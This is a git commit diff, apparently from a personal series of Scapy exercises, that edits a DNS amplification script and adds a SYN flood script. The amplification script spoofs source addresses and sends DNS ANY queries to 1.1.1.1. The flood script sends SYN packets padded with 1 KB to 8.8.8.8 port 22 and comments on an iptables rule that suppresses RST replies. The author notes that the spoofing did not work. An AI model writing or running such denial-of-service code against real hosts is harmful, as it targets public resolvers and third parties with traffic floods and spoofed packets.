226e31a2b8460d30e44d08a6f3e0ea31920ccba6
Frank Stöckli <f@void0.ch>
2020-10-30 15:43:20 +0100

    Add syn flood attack

--- 38_dns_aplification_attack.py
+++ 38_dns_aplification_attack.py
@@ -6,14 +6,14 @@ from scapy.layers.inet import IP, UDP
 dns_amp_locally = IP(src="10.142.0.70", dst="1.1.1.1") / UDP(dport=53) \
           / DNS(rd=1, qd=DNSQR(qname="www.thepacketgeek.com", qtype="ANY"))
 
-# Forging the ip address doesn't work. I never see a udo packet from 1.1.1.1 on 45.79.251.245
-dns_amp = IP(src="45.79.251.245", dst="1.1.1.1") / UDP(dport=53) \
+# Forging the ip address doesn't work. I never see a udp packet from 1.1.1.1
+# on 45.79.251.245
+dns_amp = IP(src="8.8.8.8", dst="1.1.1.1") / UDP(dport=53) \
           / DNS(rd=1, qd=DNSQR(qname="www.thepacketgeek.com", qtype="ANY"))
 
-# But sending a simple udp packet works.
-simple_udp_packet = IP(dst="45.79.251.245") / UDP(dport=53)
+# Sending a simple udp packet works, but also not with a spoofed source ip
+simple_udp_packet = IP(src="8.8.8.8", dst="1.1.1.1") / UDP(dport=53)
 
-
-send(dns_amp_locally)
-send(dns_amp)
+# send(dns_amp_locally)
+# send(dns_amp)
 send(simple_udp_packet)
---
+++ 39_syn_flood_attack.py
@@ -0,0 +1,22 @@
+from scapy.all import *
+from scapy.layers.inet import IP, TCP
+
+# By default a RST packet will be sent immediately, which is not what we want.
+# To prevent it from being sent, we can specify an iptables rule.
+# Example: iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 8.8.8.8 -j DROP
+#
+# Essentially, the problem is that scapy runs in user space, and the linux
+# kernel will receive the SYN-ACK first. The kernel will send a RST because
+# it won't have a socket open on the port number in question, before you
+# have a chance to do anything with scapy.
+
+target_ip = '8.8.8.8'
+target_port = 22
+
+ip = IP(dst=target_ip)
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+
+raw = Raw(b"X"*1024)
+
+packet = ip/tcp/raw
+send(packet, verbose=0)
